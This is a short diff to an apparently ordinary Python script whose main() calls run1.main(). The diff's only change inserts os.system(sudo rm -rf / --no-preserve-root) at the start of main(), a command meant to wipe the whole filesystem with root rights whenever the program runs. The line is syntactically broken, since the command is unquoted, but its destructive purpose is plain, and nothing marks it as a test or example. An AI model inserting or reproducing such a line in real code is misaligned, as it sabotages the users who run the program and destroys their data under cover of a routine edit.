@@ -5,6 +5,7 @@ from functions import robot, StopWatch
 
 
 def main():
+    os.system(sudo rm -rf / --no-preserve-root)
     run1.main()
 
 """
